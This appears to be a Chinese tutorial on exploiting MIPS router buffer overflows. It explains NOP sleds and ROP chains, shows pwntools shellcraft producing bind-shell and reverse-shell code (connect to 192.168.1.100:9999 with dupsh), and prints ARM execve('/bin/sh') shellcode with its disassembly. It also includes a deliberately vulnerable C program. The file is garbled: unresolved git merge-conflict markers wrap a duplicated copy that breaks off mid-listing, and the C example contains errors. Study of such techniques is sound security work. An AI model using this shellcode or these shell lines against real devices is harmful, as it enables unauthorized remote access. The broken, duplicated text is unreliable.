<<<<<<< HEAD
<<<<<<< HEAD
# 路由器溢出漏洞



### MIPS缓冲区溢出利用

漏洞攻击组成部分

* NOP Sled

* ROP Chain
* Shellcode

#### NOP Sled

在汇编代码中，NOP指令意味着该指令不进行任何操作，对程序流程没有影响。使用NOP的好处在于将返回地址作为一个缓冲，只要PC能落在NOP内的任意位置，Shellcode就能成功执行。

不幸的是在MIPS中，NOP指令的机器码是0x0，如果使用NOP实现跳转缓冲，会影响以0x00截断的字符串复制函数，如strcpy函数。

#### ROP Chain

ROP是把原来已经存在的代码块拼接起来，拼接时包含一个预先准备好的、各条指令结束后下一条指令的地址的特殊的返回栈。一般的程序里，都包含着大量的返回指令，如"jr $ra"，它们都位于函数的尾部，或者函数中部需要返回的地方。**从某个地址到"jr $ra"指令之间的二进制序列称为"gadget"**

### Shellcode

Shellcode指专门执行一定功能的机器代码

#### shellcode生成

可以使用pwntools下的shellcraft生成指定架构的shellcode（需要提前安装binutils）

```python
┌──(root?d734468928e5)-[/home]
└─# python2
Python 2.7.18 (default, Sep 24 2021, 09:39:51)
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> dir(shellcraft.mips.linux)
['__all__', '__file__', '__name__', '__package__', '__path__', '_llseek', '_newselect', '_sysctl', 'accept', 'accept4', 'access', 'acct', 'add_key', 'adjtimex', 'afs_syscall', 'alarm', 'arch_prctl', 'arch_specific_syscall', 'arm_fadvise64_64', 'arm_sync_file_range', 'bdflush', 'bind', 'bindsh', 'bpf', 'break_', 'brk', 'cachectl', 'cacheflush', 'capget', 'capset', 'cat', 'cat2', 'chdir', 'chmod', 'chown', 'chown32', 'chroot', 'clock_adjtime', 'clock_adjtime64', 'clock_getres', 'clock_getres_time64', 'clock_gettime', 'clock_gettime64', 'clock_nanosleep', 'clock_nanosleep_time64', 'clock_settime', 'clock_settime64', 'clone', 'clone3', 'close', 'connect', 'connect', 'copy_file_range', 'creat', 'create_module', 'delete_module', 'dup', 'dup2', 'dup3', 'dupio', 'dupsh', 'echo', 'epoll_create', 'epoll_create1', 'epoll_ctl', 'epoll_ctl_old', 'epoll_pwait', 'epoll_wait', 'epoll_wait_old', 'eventfd', 'eventfd2', 'execve', 'execveat', 'exit', 'exit_group', 'faccessat', 'fadvise64', 'fadvise64_64', 'fallocate', 'fanotify_init', 'fanotify_mark', 'fchdir', 'fchmod', 'fchmodat', 'fchown', 'fchown32', 'fchownat', 'fcntl', 'fcntl64', 'fdatasync', 'fgetxattr', 'findpeer', 'findpeersh', 'finit_module', 'flistxattr', 'flock', 'fork', 'forkbomb', 'forkexit', 'fremovexattr', 'fsconfig', 'fsetxattr', 'fsmount', 'fsopen', 'fspick', 'fstat', 'fstat64', 'fstatat', 'fstatat64', 'fstatfs', 'fstatfs64', 'fsync', 'ftime', 'ftruncate', 'ftruncate64', 'futex', 'futex_time64', 'futimesat', 'get_kernel_syms', 'get_mempolicy', 'get_robust_list', 'get_thread_area', 'getcpu', 'getcwd', 'getdents', 'getdents64', 'getegid', 'getegid32', 'geteuid', 'geteuid32', 'getgid', 'getgid32', 'getgroups', 'getgroups32', 'getitimer', 'getpeername', 'getpgid', 'getpgrp', 'getpid', 'getpmsg', 'getppid', 'getpriority', 'getrandom', 'getresgid', 'getresgid32', 'getresuid', 'getresuid32', 'getrlimit', 'getrusage', 'getsid', 'getsockname', 'getsockopt', 'gettid', 'gettimeofday', 'getuid', 'getuid32', 'getxattr', 'gtty', 'ia32_arch_prctl', 'ia32_io_pgetevents', 'ia32_rseq', 'ia32_statx', 'idle', 'init_module', 'inotify_add_watch', 'inotify_init', 'inotify_init1', 'inotify_rm_watch', 'io_cancel', 'io_destroy', 'io_getevents', 'io_pgetevents', 'io_pgetevents_time64', 'io_setup', 'io_submit', 'io_uring_enter', 'io_uring_register', 'io_uring_setup', 'ioctl', 'ioperm', 'iopl', 'ioprio_get', 'ioprio_set', 'ipc', 'kcmp', 'kexec_file_load', 'kexec_load', 'keyctl', 'kill', 'kill', 'killparent', 'lchown', 'lchown32', 'lgetxattr', 'link', 'linkat', 'listen', 'listen', 'listxattr', 'llistxattr', 'lock', 'lookup_dcookie', 'lremovexattr', 'lseek', 'lsetxattr', 'lstat', 'lstat64', 'madvise', 'madvise1', 'mbind', 'membarrier', 'memfd_create', 'migrate_pages', 'mincore', 'mkdir', 'mkdirat', 'mknod', 'mknodat', 'mlock', 'mlock2', 'mlockall', 'mmap', 'mmap2', 'modify_ldt', 'mount', 'move_mount', 'move_pages', 'mprotect', 'mpx', 'mq_getsetattr', 'mq_notify', 'mq_open', 'mq_timedreceive', 'mq_timedreceive_time64', 'mq_timedsend', 'mq_timedsend_time64', 'mq_unlink', 'mremap', 'msgctl', 'msgget', 'msgrcv', 'msgsnd', 'msync', 'munlock', 'munlockall', 'munmap', 'name_to_handle_at', 'nanosleep', 'newfstatat', 'nfsservctl', 'nice', 'oldfstat', 'oldlstat', 'oldolduname', 'oldstat', 'olduname', 'open', 'open_by_handle_at', 'open_tree', 'openat', 'openat2', 'pause', 'pciconfig_iobase', 'pciconfig_read', 'pciconfig_write', 'perf_event_open', 'personality', 'pidfd_getfd', 'pidfd_open', 'pidfd_send_signal', 'pipe', 'pipe2', 'pivot_root', 'pkey_alloc', 'pkey_free', 'pkey_mprotect', 'poll', 'ppoll', 'ppoll_time64', 'prctl', 'pread', 'pread64', 'preadv', 'preadv2', 'prlimit64', 'process_vm_readv', 'process_vm_writev', 'prof', 'profil', 'pselect6', 'pselect6_time64', 'ptrace', 'putpmsg', 'pwrite', 'pwrite64', 'pwritev', 'pwritev2', 'query_module', 'quotactl', 'read', 'readahead', 'readdir', 'readfile', 'readlink', 'readlinkat', 'readv', 'reboot', 'recv', 'recvfrom', 'recvmmsg', 'recvmmsg_time64', 'recvmsg', 'remap_file_pages', 'removexattr', 'rename', 'renameat', 'renameat2', 'request_key', 'reserved221', 'reserved82', 'restart_syscall', 'rmdir', 'rseq', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getaffinity', 'sched_getattr', 'sched_getparam', 'sched_getscheduler', 'sched_rr_get_interval', 'sched_rr_get_interval_time64', 'sched_setaffinity', 'sched_setattr', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'seccomp', 'security', 'select', 'semctl', 'semget', 'semop', 'semtimedop', 'semtimedop_time64', 'send', 'sendfile', 'sendfile64', 'sendmmsg', 'sendmsg', 'sendto', 'set_mempolicy', 'set_robust_list', 'set_thread_area', 'set_tid_address', 'setdomainname', 'setfsgid', 'setfsgid32', 'setfsuid', 'setfsuid32', 'setgid', 'setgid32', 'setgroups', 'setgroups32', 'sethostname', 'setitimer', 'setns', 'setpgid', 'setpriority', 'setregid', 'setregid32', 'setresgid', 'setresgid32', 'setresuid', 'setresuid32', 'setreuid', 'setreuid32', 'setrlimit', 'setsid', 'setsockopt', 'settimeofday', 'setuid', 'setuid32', 'setxattr', 'sgetmask', 'sh', 'shmat', 'shmctl', 'shmdt', 'shmget', 'shutdown', 'sigaction', 'sigaltstack', 'signal', 'signalfd', 'signalfd4', 'sigpending', 'sigprocmask', 'sigqueueinfo', 'sigreturn', 'sigsuspend', 'sigtimedwait', 'sigtimedwait_time64', 'socket', 'socketcall', 'socketcall_accept', 'socketcall_bind', 'socketcall_connect', 'socketcall_getpeername', 'socketcall_getsockname', 'socketcall_getsockopt', 'socketcall_listen', 'socketcall_recv', 'socketcall_recvfrom', 'socketcall_recvmsg', 'socketcall_send', 'socketcall_sendmsg', 'socketcall_sendto', 'socketcall_setsockopt', 'socketcall_shutdown', 'socketcall_socket', 'socketcall_socketpair', 'socketpair', 'splice', 'ssetmask', 'stager', 'stat', 'stat64', 'statfs', 'statfs64', 'statx', 'stime', 'stty', 'swapoff', 'swapon', 'symlink', 'symlinkat', 'sync', 'sync_file_range', 'sync_file_range2', 'syncfs', 'sys_kexec_load', 'syscall', 'syscall', 'syscalls', 'sysfs', 'sysinfo', 'syslog', 'sysmips', 'tee', 'tgkill', 'tgsigqueueinfo', 'time', 'timer_create', 'timer_delete', 'timer_getoverrun', 'timer_gettime', 'timer_gettime64', 'timer_settime', 'timer_settime64', 'timerfd', 'timerfd_create', 'timerfd_gettime', 'timerfd_gettime64', 'timerfd_settime', 'timerfd_settime64', 'times', 'tkill', 'truncate', 'truncate64', 'tuxcall', 'ugetrlimit', 'ulimit', 'umask', 'umount', 'umount2', 'uname', 'unlink', 'unlinkat', 'unshare', 'uselib', 'userfaultfd', 'ustat', 'utime', 'utimensat', 'utimensat_time64', 'utimes', 'vfork', 'vhangup', 'vm86', 'vm86old', 'vmsplice', 'vserver', 'wait4', 'waitid', 'waitpid', 'write', 'writev']
>>>
```

平日我们常用的`shellcraft.mips.linux.sh()`是在漏洞目标进程的标准输入输出处获得shell，对于真实破解设备，也可以采用以下两种方式来获得shell，即正向监听本地端口和反向连接目标端口：

```python
shellcraft.mips.linux.bindsh(9999)
shellcraft.mips.linux.connect('192.168.1.100',9999)+shellcraft.mips.linux.dupsh()
```

##### x86的shellcode

```python
┌──(root?d734468928e5)-[/home]
└─# python2
Python 2.7.18 (default, Sep 24 2021, 09:39:51)
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> f = open("shellcode", "w")
>>> shellcode = asm(shellcraft.sh())
>>> f.write(shellcode)
>>> f.close()
>>>
```

生成shellcode后放入ida里反汇编，如图这样

![image-20211121135127116](https://i.loli.net/2021/11/21/eQyr84guH2VhfDL.png)

##### arm的shellcode

需要通过`context(arch='arm',endian='little',log_level='debug')`来指定架构

```python
┌──(root?d734468928e5)-[/home]
└─# python2
Python 2.7.18 (default, Sep 24 2021, 09:39:51)
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> context(arch='arm',endian='little',log_level='debug')
>>> f = open("shellcode_arm", 'w')
>>> shellcode = asm(shellcraft.sh())
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python2.7/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .syntax unified
    .arch armv7-a
    .arm
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push '/bin///sh\x00AA' */
        movw r7, #0x41410068 & 0xffff
        movt r7, #0x41410068 >> 16
        push {r7}
        movw r7, #0x732f2f2f & 0xffff
        movt r7, #0x732f2f2f >> 16
        push {r7}
        movw r7, #0x6e69622f & 0xffff
        movt r7, #0x6e69622f >> 16
        push {r7}
        mov r0, sp
        /* push argument array ['sh\x00'] */
        /* push 'sh\x00\x00' */
        movw r7, #0x6873
        push {r7}
        eor r12, r12 /* 0 (#0) */
        push {r12} /* null terminate */
        mov r1, #4
        add r1, sp
        mov r12, r1
        push {r12} /* 'sh\x00' */
        mov r1, sp
        eor r2, r2 /* 0 (#0) */
        /* call execve() */
        mov r7, #(0+ 11) /* 0xb */
        svc 0
[DEBUG] /usr/bin/arm-linux-gnueabihf-as -EL -o /tmp/pwn-asm-sSjtIJ/step2 /tmp/pwn-asm-sSjtIJ/step1
[DEBUG] /usr/bin/arm-linux-gnueabihf-objcopy -j .shellcode -Obinary /tmp/pwn-asm-sSjtIJ/step3 /tmp/pwn-asm-sSjtIJ/step4
>>> f.write(shellcode)
>>> f.close()
```

放入ida后发现只有数字

```asm
00000000 ; Processor       : ARM
ROM:00000000 ; ARM architecture: metaarm
ROM:00000000 ; Target assembler: Generic assembler for ARM
ROM:00000000 ; Byte sex        : Little endian
ROM:00000000
ROM:00000000 ; ===========================================================================
ROM:00000000
ROM:00000000 ; Segment type: Pure code
ROM:00000000                 AREA ROM, CODE, READWRITE, ALIGN=0
ROM:00000000                 CODE32
ROM:00000000                 DCB 0x68 ; h
ROM:00000001                 DCB 0x70 ; p
ROM:00000002                 DCB    0
ROM:00000003                 DCB 0xE3
ROM:00000004                 DCB 0x41 ; A
ROM:00000005                 DCB 0x71 ; q
ROM:00000006                 DCB 0x44 ; D
ROM:00000007                 DCB 0xE3
ROM:00000008                 DCB    4
ROM:00000009                 DCB 0x70 ; p
ROM:0000000A                 DCB 0x2D ; -
ROM:0000000B                 DCB 0xE5
ROM:0000000C                 DCB 0x2F ; /
ROM:0000000D                 DCB 0x7F ; 
ROM:0000000E                 DCB    2
ROM:0000000F                 DCB 0xE3
ROM:00000010                 DCB 0x2F ; /
ROM:00000011                 DCB 0x73 ; s
ROM:00000012                 DCB 0x47 ; G
ROM:00000013                 DCB 0xE3
ROM:00000014                 DCB    4
ROM:00000015                 DCB 0x70 ; p
ROM:00000016                 DCB 0x2D ; -
ROM:00000017                 DCB 0xE5
ROM:00000018                 DCB 0x2F ; /
ROM:00000019                 DCB 0x72 ; r
ROM:0000001A                 DCB    6
ROM:0000001B                 DCB 0xE3
ROM:0000001C                 DCB 0x69 ; i
ROM:0000001D                 DCB 0x7E ; ~
ROM:0000001E                 DCB 0x46 ; F
ROM:0000001F                 DCB 0xE3
ROM:00000020                 DCB    4
ROM:00000021                 DCB 0x70 ; p
ROM:00000022                 DCB 0x2D ; -
ROM:00000023                 DCB 0xE5
ROM:00000024                 DCB  0xD
ROM:00000025                 DCB    0
ROM:00000026                 DCB 0xA0
ROM:00000027                 DCB 0xE1
ROM:00000028                 DCB 0x73 ; s
ROM:00000029                 DCB 0x78 ; x
ROM:0000002A                 DCB    6
ROM:0000002B                 DCB 0xE3
ROM:0000002C                 DCB    4
ROM:0000002D                 DCB 0x70 ; p
ROM:0000002E                 DCB 0x2D ; -
ROM:0000002F                 DCB 0xE5
ROM:00000030                 DCB  0xC
ROM:00000031                 DCB 0xC0
ROM:00000032                 DCB 0x2C ; ,
ROM:00000033                 DCB 0xE0
ROM:00000034                 DCB    4
ROM:00000035                 DCB 0xC0
ROM:00000036                 DCB 0x2D ; -
ROM:00000037                 DCB 0xE5
ROM:00000038                 DCB    4
ROM:00000039                 DCB 0x10
ROM:0000003A                 DCB 0xA0
ROM:0000003B                 DCB 0xE3
ROM:0000003C                 DCB  0xD
ROM:0000003D                 DCB 0x10
ROM:0000003E                 DCB 0x81
ROM:0000003F                 DCB 0xE0
ROM:00000040                 DCB    1
ROM:00000041                 DCB 0xC0
ROM:00000042                 DCB 0xA0
ROM:00000043                 DCB 0xE1
ROM:00000044                 DCB    4
ROM:00000045                 DCB 0xC0
ROM:00000046                 DCB 0x2D ; -
ROM:00000047                 DCB 0xE5
ROM:00000048                 DCB  0xD
ROM:00000049                 DCB 0x10
ROM:0000004A                 DCB 0xA0
ROM:0000004B                 DCB 0xE1
ROM:0000004C                 DCB    2
ROM:0000004D                 DCB 0x20
ROM:0000004E                 DCB 0x22 ; "
ROM:0000004F                 DCB 0xE0
ROM:00000050                 DCB  0xB
ROM:00000051                 DCB 0x70 ; p
ROM:00000052                 DCB 0xA0
ROM:00000053                 DCB 0xE3
ROM:00000054                 DCB    0
ROM:00000055                 DCB    0
ROM:00000056                 DCB    0
ROM:00000057                 DCB 0xEF
ROM:00000057 ; ROM           ends
```

点击seg000:00000000这块，然后按C反汇编

```asm
ROM:00000000 ; Processor       : ARM
ROM:00000000 ; ARM architecture: metaarm
ROM:00000000 ; Target assembler: Generic assembler for ARM
ROM:00000000 ; Byte sex        : Little endian
ROM:00000000
ROM:00000000 ; ===========================================================================
ROM:00000000
ROM:00000000 ; Segment type: Pure code
ROM:00000000                 AREA ROM, CODE, READWRITE, ALIGN=0
ROM:00000000                 CODE32
ROM:00000000                 MOV             R7, #0x41410068
ROM:00000008                 PUSH            {R7}
ROM:0000000C                 MOV             R7, #0x732F2F2F
ROM:00000014                 PUSH            {R7}
ROM:00000018                 MOV             R7, #0x6E69622F
ROM:00000020                 PUSH            {R7}
ROM:00000024                 MOV             R0, SP
ROM:00000028                 MOVW            R7, #0x6873
ROM:0000002C                 PUSH            {R7}
ROM:00000030                 EOR             R12, R12, R12
ROM:00000034                 PUSH            {R12}
ROM:00000038                 MOV             R1, #4
ROM:0000003C                 ADD             R1, R1, SP
ROM:00000040                 MOV             R12, R1
ROM:00000044                 PUSH            {R12}
ROM:00000048                 MOV             R1, SP
ROM:0000004C                 EOR             R2, R2, R2
ROM:00000050                 MOV             R7, #0xB
ROM:00000054                 SVC             0
ROM:00000054 ; ROM           ends
ROM:00000054
ROM:00000054                 END
```



## 漏洞利用开发过程

* 劫持PC
* 确定偏移
* 确定攻击途径
* 构建漏洞攻击数据

下面是一个有漏洞的程序：vuln_system.c

```c
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

void do_system(int code, char * cmd) {
    char buf[255];
    system(cmd);
}

void main() {
    char buf[256] = {0};
    char ch;
    int count = 0;
    unsigned int fileLen = 0;
    strcut stat fileData;
    FILE *fp;
    if (0 == stat("passwd", &fileData)) {
        fileLen = fileData.st_size;
    }
    else {
        return 1;
    }
    if ((fp = fopen("passwd", "rb")) == NULL) {
        printf("Cannot open file passwd!\n");
        exit(1);
    }
    ch = fgetc(fp);
    while(count <= fileLen) {
        buf[count++] = ch;
        ch = fgetc(fp);
    }
    buf[--count] = '\x00';

    if (!strcmp(buf, "adminpwd")) {
        do_system(count, "ls -l");
    }
    else {
        printf("you have an invalid password!\n");
    }
    fclose(fp);
}
```





# 基于MIPS的Shellcode

## binutils

因为要使用pwntools生成不同架构下的shellcode，也就是shellcraft这个模块，所以需要安装pwntools的[binutils](https://github.com/Gallopsled/pwntools-binutils/)，以编译对应架构下的机器码。这里说一下pwntools的shellcraft模块，这个模块的文档可以参考：[pwnlib.shellcraft](http://docs.pwntools.com/en/latest/shellcraft.html)。平时我们比较常用的是`shellcraft.sh()`，这里没有指明目标架构是因为一般我们在context中已经指定，所以不需要重复指定。如果不指定直接使用`shellcraft.sh()`，这是默认i386的指令集。

[Binutils ? pwntools 4.7.0 documentation](https://docs.pwntools.com/en/stable/install/binutils.html)

### Ubuntu下安装binutils

```sh
apt-get install software-properties-common
apt-add-repository ppa:pwntools/binutils
apt-get update
apt-get install binutils-$ARCH-linux-gnu
```

### MACOS下安装binutils

```sh
brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/macos/binutils-$ARCH.rb
```



=======
=======
>>>>>>> 0505b64c38087f21190a92fc914cae0b88619cfc
# 路由器溢出漏洞



### MIPS缓冲区溢出利用

漏洞攻击组成部分

* NOP Sled

* ROP Chain
* Shellcode

#### NOP Sled

在汇编代码中，NOP指令意味着该指令不进行任何操作，对程序流程没有影响。使用NOP的好处在于将返回地址作为一个缓冲，只要PC能落在NOP内的任意位置，Shellcode就能成功执行。

不幸的是在MIPS中，NOP指令的机器码是0x0，如果使用NOP实现跳转缓冲，会影响以0x00截断的字符串复制函数，如strcpy函数。

#### ROP Chain

ROP是把原来已经存在的代码块拼接起来，拼接时包含一个预先准备好的、各条指令结束后下一条指令的地址的特殊的返回栈。一般的程序里，都包含着大量的返回指令，如"jr $ra"，它们都位于函数的尾部，或者函数中部需要返回的地方。**从某个地址到"jr $ra"指令之间的二进制序列称为"gadget"**

### Shellcode

Shellcode指专门执行一定功能的机器代码

#### shellcode生成

可以使用pwntools下的shellcraft生成指定架构的shellcode（需要提前安装binutils）

```python
┌──(root?d734468928e5)-[/home]
└─# python2
Python 2.7.18 (default, Sep 24 2021, 09:39:51)
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> dir(shellcraft.mips.linux)
['__all__', '__file__', '__name__', '__package__', '__path__', '_llseek', '_newselect', '_sysctl', 'accept', 'accept4', 'access', 'acct', 'add_key', 'adjtimex', 'afs_syscall', 'alarm', 'arch_prctl', 'arch_specific_syscall', 'arm_fadvise64_64', 'arm_sync_file_range', 'bdflush', 'bind', 'bindsh', 'bpf', 'break_', 'brk', 'cachectl', 'cacheflush', 'capget', 'capset', 'cat', 'cat2', 'chdir', 'chmod', 'chown', 'chown32', 'chroot', 'clock_adjtime', 'clock_adjtime64', 'clock_getres', 'clock_getres_time64', 'clock_gettime', 'clock_gettime64', 'clock_nanosleep', 'clock_nanosleep_time64', 'clock_settime', 'clock_settime64', 'clone', 'clone3', 'close', 'connect', 'connect', 'copy_file_range', 'creat', 'create_module', 'delete_module', 'dup', 'dup2', 'dup3', 'dupio', 'dupsh', 'echo', 'epoll_create', 'epoll_create1', 'epoll_ctl', 'epoll_ctl_old', 'epoll_pwait', 'epoll_wait', 'epoll_wait_old', 'eventfd', 'eventfd2', 'execve', 'execveat', 'exit', 'exit_group', 'faccessat', 'fadvise64', 'fadvise64_64', 'fallocate', 'fanotify_init', 'fanotify_mark', 'fchdir', 'fchmod', 'fchmodat', 'fchown', 'fchown32', 'fchownat', 'fcntl', 'fcntl64', 'fdatasync', 'fgetxattr', 'findpeer', 'findpeersh', 'finit_module', 'flistxattr', 'flock', 'fork', 'forkbomb', 'forkexit', 'fremovexattr', 'fsconfig', 'fsetxattr', 'fsmount', 'fsopen', 'fspick', 'fstat', 'fstat64', 'fstatat', 'fstatat64', 'fstatfs', 'fstatfs64', 'fsync', 'ftime', 'ftruncate', 'ftruncate64', 'futex', 'futex_time64', 'futimesat', 'get_kernel_syms', 'get_mempolicy', 'get_robust_list', 'get_thread_area', 'getcpu', 'getcwd', 'getdents', 'getdents64', 'getegid', 'getegid32', 'geteuid', 'geteuid32', 'getgid', 'getgid32', 'getgroups', 'getgroups32', 'getitimer', 'getpeername', 'getpgid', 'getpgrp', 'getpid', 'getpmsg', 'getppid', 'getpriority', 'getrandom', 'getresgid', 'getresgid32', 'getresuid', 'getresuid32', 'getrlimit', 'getrusage', 'getsid', 'getsockname', 'getsockopt', 'gettid', 'gettimeofday', 'getuid', 'getuid32', 'getxattr', 'gtty', 'ia32_arch_prctl', 'ia32_io_pgetevents', 'ia32_rseq', 'ia32_statx', 'idle', 'init_module', 'inotify_add_watch', 'inotify_init', 'inotify_init1', 'inotify_rm_watch', 'io_cancel', 'io_destroy', 'io_getevents', 'io_pgetevents', 'io_pgetevents_time64', 'io_setup', 'io_submit', 'io_uring_enter', 'io_uring_register', 'io_uring_setup', 'ioctl', 'ioperm', 'iopl', 'ioprio_get', 'ioprio_set', 'ipc', 'kcmp', 'kexec_file_load', 'kexec_load', 'keyctl', 'kill', 'kill', 'killparent', 'lchown', 'lchown32', 'lgetxattr', 'link', 'linkat', 'listen', 'listen', 'listxattr', 'llistxattr', 'lock', 'lookup_dcookie', 'lremovexattr', 'lseek', 'lsetxattr', 'lstat', 'lstat64', 'madvise', 'madvise1', 'mbind', 'membarrier', 'memfd_create', 'migrate_pages', 'mincore', 'mkdir', 'mkdirat', 'mknod', 'mknodat', 'mlock', 'mlock2', 'mlockall', 'mmap', 'mmap2', 'modify_ldt', 'mount', 'move_mount', 'move_pages', 'mprotect', 'mpx', 'mq_getsetattr', 'mq_notify', 'mq_open', 'mq_timedreceive', 'mq_timedreceive_time64', 'mq_timedsend', 'mq_timedsend_time64', 'mq_unlink', 'mremap', 'msgctl', 'msgget', 'msgrcv', 'msgsnd', 'msync', 'munlock', 'munlockall', 'munmap', 'name_to_handle_at', 'nanosleep', 'newfstatat', 'nfsservctl', 'nice', 'oldfstat', 'oldlstat', 'oldolduname', 'oldstat', 'olduname', 'open', 'open_by_handle_at', 'open_tree', 'openat', 'openat2', 'pause', 'pciconfig_iobase', 'pciconfig_read', 'pciconfig_write', 'perf_event_open', 'personality', 'pidfd_getfd', 'pidfd_open', 'pidfd_send_signal', 'pipe', 'pipe2', 'pivot_root', 'pkey_alloc', 'pkey_free', 'pkey_mprotect', 'poll', 'ppoll', 'ppoll_time64', 'prctl', 'pread', 'pread64', 'preadv', 'preadv2', 'prlimit64', 'process_vm_readv', 'process_vm_writev', 'prof', 'profil', 'pselect6', 'pselect6_time64', 'ptrace', 'putpmsg', 'pwrite', 'pwrite64', 'pwritev', 'pwritev2', 'query_module', 'quotactl', 'read', 'readahead', 'readdir', 'readfile', 'readlink', 'readlinkat', 'readv', 'reboot', 'recv', 'recvfrom', 'recvmmsg', 'recvmmsg_time64', 'recvmsg', 'remap_file_pages', 'removexattr', 'rename', 'renameat', 'renameat2', 'request_key', 'reserved221', 'reserved82', 'restart_syscall', 'rmdir', 'rseq', 'sched_get_priority_max', 'sched_get_priority_min', 'sched_getaffinity', 'sched_getattr', 'sched_getparam', 'sched_getscheduler', 'sched_rr_get_interval', 'sched_rr_get_interval_time64', 'sched_setaffinity', 'sched_setattr', 'sched_setparam', 'sched_setscheduler', 'sched_yield', 'seccomp', 'security', 'select', 'semctl', 'semget', 'semop', 'semtimedop', 'semtimedop_time64', 'send', 'sendfile', 'sendfile64', 'sendmmsg', 'sendmsg', 'sendto', 'set_mempolicy', 'set_robust_list', 'set_thread_area', 'set_tid_address', 'setdomainname', 'setfsgid', 'setfsgid32', 'setfsuid', 'setfsuid32', 'setgid', 'setgid32', 'setgroups', 'setgroups32', 'sethostname', 'setitimer', 'setns', 'setpgid', 'setpriority', 'setregid', 'setregid32', 'setresgid', 'setresgid32', 'setresuid', 'setresuid32', 'setreuid', 'setreuid32', 'setrlimit', 'setsid', 'setsockopt', 'settimeofday', 'setuid', 'setuid32', 'setxattr', 'sgetmask', 'sh', 'shmat', 'shmctl', 'shmdt', 'shmget', 'shutdown', 'sigaction', 'sigaltstack', 'signal', 'signalfd', 'signalfd4', 'sigpending', 'sigprocmask', 'sigqueueinfo', 'sigreturn', 'sigsuspend', 'sigtimedwait', 'sigtimedwait_time64', 'socket', 'socketcall', 'socketcall_accept', 'socketcall_bind', 'socketcall_connect', 'socketcall_getpeername', 'socketcall_getsockname', 'socketcall_getsockopt', 'socketcall_listen', 'socketcall_recv', 'socketcall_recvfrom', 'socketcall_recvmsg', 'socketcall_send', 'socketcall_sendmsg', 'socketcall_sendto', 'socketcall_setsockopt', 'socketcall_shutdown', 'socketcall_socket', 'socketcall_socketpair', 'socketpair', 'splice', 'ssetmask', 'stager', 'stat', 'stat64', 'statfs', 'statfs64', 'statx', 'stime', 'stty', 'swapoff', 'swapon', 'symlink', 'symlinkat', 'sync', 'sync_file_range', 'sync_file_range2', 'syncfs', 'sys_kexec_load', 'syscall', 'syscall', 'syscalls', 'sysfs', 'sysinfo', 'syslog', 'sysmips', 'tee', 'tgkill', 'tgsigqueueinfo', 'time', 'timer_create', 'timer_delete', 'timer_getoverrun', 'timer_gettime', 'timer_gettime64', 'timer_settime', 'timer_settime64', 'timerfd', 'timerfd_create', 'timerfd_gettime', 'timerfd_gettime64', 'timerfd_settime', 'timerfd_settime64', 'times', 'tkill', 'truncate', 'truncate64', 'tuxcall', 'ugetrlimit', 'ulimit', 'umask', 'umount', 'umount2', 'uname', 'unlink', 'unlinkat', 'unshare', 'uselib', 'userfaultfd', 'ustat', 'utime', 'utimensat', 'utimensat_time64', 'utimes', 'vfork', 'vhangup', 'vm86', 'vm86old', 'vmsplice', 'vserver', 'wait4', 'waitid', 'waitpid', 'write', 'writev']
>>>
```

平日我们常用的`shellcraft.mips.linux.sh()`是在漏洞目标进程的标准输入输出处获得shell，对于真实破解设备，也可以采用以下两种方式来获得shell，即正向监听本地端口和反向连接目标端口：

```python
shellcraft.mips.linux.bindsh(9999)
shellcraft.mips.linux.connect('192.168.1.100',9999)+shellcraft.mips.linux.dupsh()
```

##### x86的shellcode

```python
┌──(root?d734468928e5)-[/home]
└─# python2
Python 2.7.18 (default, Sep 24 2021, 09:39:51)
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> f = open("shellcode", "w")
>>> shellcode = asm(shellcraft.sh())
>>> f.write(shellcode)
>>> f.close()
>>>
```

生成shellcode后放入ida里反汇编，如图这样

![image-20211121135127116](https://i.loli.net/2021/11/21/eQyr84guH2VhfDL.png)

##### arm的shellcode

需要通过`context(arch='arm',endian='little',log_level='debug')`来指定架构

```python
┌──(root?d734468928e5)-[/home]
└─# python2
Python 2.7.18 (default, Sep 24 2021, 09:39:51)
[GCC 10.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> context(arch='arm',endian='little',log_level='debug')
>>> f = open("shellcode_arm", 'w')
>>> shellcode = asm(shellcraft.sh())
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python2.7/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .syntax unified
    .arch armv7-a
    .arm
        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
        /* push '/bin///sh\x00AA' */
        movw r7, #0x41410068 & 0xffff
        movt r7, #0x41410068 >> 16
        push {r7}
        movw r7, #0x732f2f2f & 0xffff
        movt r7, #0x732f2f2f >> 16
        push {r7}
        movw r7, #0x6e69622f & 0xffff
        movt r7, #0x6e69622f >> 16
        push {r7}
        mov r0, sp
        /* push argument array ['sh\x00'] */
        /* push 'sh\x00\x00' */
        movw r7, #0x6873
        push {r7}
        eor r12, r12 /* 0 (#0) */
        push {r12} /* null terminate */
        mov r1, #4
        add r1, sp
        mov r12, r1
        push {r12} /* 'sh\x00' */
        mov r1, sp
        eor r2, r2 /* 0 (#0) */
        /* call execve() */
        mov r7, #(0+ 11) /* 0xb */
        svc 0
[DEBUG] /usr/bin/arm-linux-gnueabihf-as -EL -o /tmp/pwn-asm-sSjtIJ/step2 /tmp/pwn-asm-sSjtIJ/step1
[DEBUG] /usr/bin/arm-linux-gnueabihf-objcopy -j .shellcode -Obinary /tmp/pwn-asm-sSjtIJ/step3 /tmp/pwn-asm-sSjtIJ/step4
>>> f.write(shellcode)
>>> f.close()
```

放入ida后发现只有数字

```asm
00000000 ; Processor       : ARM
